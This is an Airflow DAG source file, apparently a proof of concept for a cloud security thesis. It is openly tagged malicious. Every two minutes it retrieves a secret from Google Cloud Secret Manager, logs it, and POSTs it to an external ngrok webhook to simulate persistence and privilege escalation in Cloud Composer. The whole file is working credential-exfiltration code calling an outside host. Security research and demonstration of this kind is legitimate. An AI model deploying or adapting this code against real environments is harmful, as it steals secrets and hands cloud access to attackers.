from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime
from google.cloud import secretmanager
import requests
import logging

webhook_url = "https://bdbf275bd161.ngrok-free.app"

def exfiltrate_secret():
    logging.warning("[*] Starting DAG execution...")

    try:
        # Acceder al secreto desde Secret Manager
        client = secretmanager.SecretManagerServiceClient()
        secret_name = "projects/poc-tfm-tests/secrets/test-secret/versions/latest"
        response = client.access_secret_version(name=secret_name)
        secret_value = response.payload.data.decode("UTF-8")

        logging.warning(f"[PWNED] Retrieved secret: {secret_value}")

        # Exfiltrar mediante webhook si está configurado correctamente
        if webhook_url and webhook_url.startswith("http"):
            payload = {
                "secret": secret_value,
                "source": "composer-dag"
            }
            r = requests.post(webhook_url, json=payload)
            logging.warning(f"[PWNED] Sent POST to {webhook_url}, status: {r.status_code}")
        else:
            logging.warning("[!] Webhook URL not set correctly, skipping POST request.")

    except Exception as e:
        logging.warning(f"[!] Exception during DAG execution: {e}")

with DAG(
    dag_id="persistent_escalated_dag",
    start_date=datetime(2023, 1, 1),
    schedule_interval="*/2 * * * *",  # Ejecutar cada 2 minutos
    catchup=False,
    tags=["malicious"]
) as dag:

    dag.doc_md = """
    ## Persistent Escalated DAG
    This malicious DAG periodically retrieves a secret from Secret Manager
    and sends it to an external webhook. Simulates persistence and privilege escalation.
    """

    task = PythonOperator(
        task_id="exfiltrate_secret_task",
        python_callable=exfiltrate_secret
    )
